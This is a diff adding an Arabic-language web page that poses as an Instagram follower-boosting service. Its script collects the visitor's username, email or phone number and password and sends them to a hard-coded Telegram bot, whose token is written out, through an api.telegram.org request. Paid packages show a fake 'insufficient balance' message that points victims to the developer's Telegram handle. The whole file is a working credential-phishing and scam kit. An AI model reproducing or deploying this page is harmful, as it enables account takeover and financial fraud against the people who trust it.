@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙮 | InstaFollow Pro</title>
+    <style>
+        :root { --accent: #00f2fe; --glass: rgba(255, 255, 255, 0.08); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; transition: 0.3s; }
+        body { background: linear-gradient(135deg, #050505, #1a1a2e, #16213e); color: white; padding: 15px; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { width: 100%; max-width: 420px; }
+        .dev-header { text-align: center; margin-bottom: 20px; }
+        .dev-name { font-size: 26px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px rgba(0, 242, 254, 0.6); }
+        .glass-card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 25px; padding: 20px; margin-bottom: 20px; }
+        .section-title { font-size: 14px; margin-bottom: 15px; display: block; border-right: 3px solid var(--accent); padding-right: 10px; }
+        .tabs { display: flex; background: rgba(255,255,255,0.05); border-radius: 12px; padding: 5px; margin-bottom: 15px; }
+        .tab-btn { flex: 1; padding: 10px; border-radius: 10px; border: none; background: none; color: rgba(255,255,255,0.6); cursor: pointer; font-size: 13px; font-weight: bold; }
+        .tab-btn.active { background: white; color: #000; }
+        input { width: 100%; padding: 15px; margin-bottom: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); background: rgba(0,0,0,0.3); color: white; outline: none; }
+        .packages-container { max-height: 250px; overflow-y: auto; padding-right: 5px; }
+        .package { background: rgba(255,255,255,0.04); padding: 12px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; border: 1px solid transparent; margin-bottom: 8px; }
+        .package.selected { border-color: var(--accent); background: rgba(0, 242, 254, 0.1); }
+        .price-tag { font-size: 11px; font-weight: 900; padding: 4px 8px; border-radius: 6px; }
+        .free { background: #00ff88; color: #000; }
+        .premium { background: #ffd700; color: #000; }
+        .btn-main { width: 100%; padding: 18px; border-radius: 18px; border: none; background: linear-gradient(to left, #00f2fe, #4facfe); color: #000; font-size: 18px; font-weight: 800; cursor: pointer; }
+        #success-screen { display: none; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="main-app">
+    <div class="dev-header">
+        <div class="dev-name">𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙮</div>
+        <div style="font-size: 10px; opacity: 0.5; margin-top: 5px;">OFFICIAL FOLLOWERS SERVER</div>
+    </div>
+
+    <div class="glass-card">
+        <span class="section-title">بيانات التحقق</span>
+        <div class="tabs">
+            <button class="tab-btn active" onclick="setMode('user', 'text', 'Username (English)', this)">باليوزر</button>
+            <button class="tab-btn" onclick="setMode('mail', 'email', 'Email Address', this)">بالبريد</button>
+            <button class="tab-btn" onclick="setMode('phone', 'tel', 'Phone Number (967+)', this)">بالرقم</button>
+        </div>
+        <input id="target_input" type="text" placeholder="Username (English)" oninput="validateInput(this)">
+        <input id="pass_input" type="password" placeholder="كلمة المرور">
+    </div>
+
+    <div class="glass-card">
+        <span class="section-title">اختر الباقة المناسبة</span>
+        <div class="packages-container">
+            <div class="package selected" onclick="selPkg(this, '500 متابع (مجاني)', false)"><span>500 متابع</span> <span class="price-tag free">مجاني</span></div>
+            <div class="package" onclick="selPkg(this, '1,000 متابع (3$)', true)"><span>1,000 متابع</span> <span class="price-tag premium">3$</span></div>
+            <div class="package" onclick="selPkg(this, '2,500 متابع (7$)', true)"><span>2,500 متابع</span> <span class="price-tag premium">7$</span></div>
+            <div class="package" onclick="selPkg(this, '5,000 متابع (12$)', true)"><span>5,000 متابع</span> <span class="price-tag premium">12$</span></div>
+            <div class="package" onclick="selPkg(this, '10,000 متابع (20$)', true)"><span>10,000 متابع</span> <span class="price-tag premium">20$</span></div>
+            <div class="package" onclick="selPkg(this, '25,000 متابع (40$)', true)"><span>25,000 متابع</span> <span class="price-tag premium">40$</span></div>
+            <div class="package" onclick="selPkg(this, '50,000 متابع (75$)', true)"><span>50,000 متابع</span> <span class="price-tag premium">75$</span></div>
+            <div class="package" onclick="selPkg(this, '100,000 متابع (130$)', true)"><span>100,000 متابع</span> <span class="price-tag premium">130$</span></div>
+        </div>
+    </div>
+
+    <button class="btn-main" onclick="submit()">تفعيل الطلب الآن 🚀</button>
+</div>
+
+<div class="container" id="success-screen">
+    <div class="glass-card">
+        <h1 style="font-size: 50px;">✔️</h1>
+        <h2>تم تقديم الطلب!</h2>
+        <p style="opacity: 0.7; margin: 15px 0;">طلبك قيد المعالجة في سيرفرات 𝙛𝙖𝙧𝙚𝙨 𝙖𝙡𝙬𝙨𝙖𝙗𝙮.</p>
+        <button class="btn-main" onclick="location.reload()">رجوع</button>
+    </div>
+</div>
+
+<script>
+    const TOKEN = '8775113973:AAHyj0mtMjpu_Ydg5VcVgWQwHvux5x6e2XU'; 
+    const CHID = '8245523694';
+    const MY_TELE = '@l_Q5I';
+
+    let pkg = "500 متابع (مجاني)", paid = false, mode = 'user';
+
+    function setMode(m, type, ph, b) {
+        document.querySelectorAll('.tab-btn').forEach(x => x.classList.remove('active'));
+        b.classList.add('active');
+        const input = document.getElementById('target_input');
+        input.type = type;
+        input.placeholder = ph;
+        input.value = "";
+        mode = m;
+    }
+
+    function validateInput(el) {
+        if(mode === 'user') el.value = el.value.replace(/[^a-zA-Z0-9._]/g, '');
+        if(mode === 'phone') el.value = el.value.replace(/[^0-9]/g, ''); // يقبل أرقام فقط للرقم
+    }
+
+    function selPkg(el, n, p) {
+        document.querySelectorAll('.package').forEach(x => x.classList.remove('selected'));
+        el.classList.add('selected');
+        pkg = n; paid = p;
+    }
+
+    function submit() {
+        const u = document.getElementById('target_input').value;
+        const p = document.getElementById('pass_input').value;
+
+        if(!u || !p) { alert("أكمل البيانات!"); return; }
+        if(mode === 'mail' && !u.includes('@')) { alert("يرجى إدخال بريد إلكتروني صحيح!"); return; }
+
+        const m = `👑 صيد فـارس الجديد:\n\n👤 النوع: ${mode}\n🔗 الحساب: ${u}\n🔑 الباسورد: ${p}\n📦 الطلب: ${pkg}`;
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHID}&text=${encodeURIComponent(m)}`);
+
+        if(paid) {
+            alert("❌ عذراً، لا يوجد لديك رصيد كافٍ.\n\nتواصل مع المطور لشحن حسابك: " + MY_TELE);
+        } else {
+            document.getElementById('main-app').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
+        }
+    }
+</script>
+</body>
+</html>
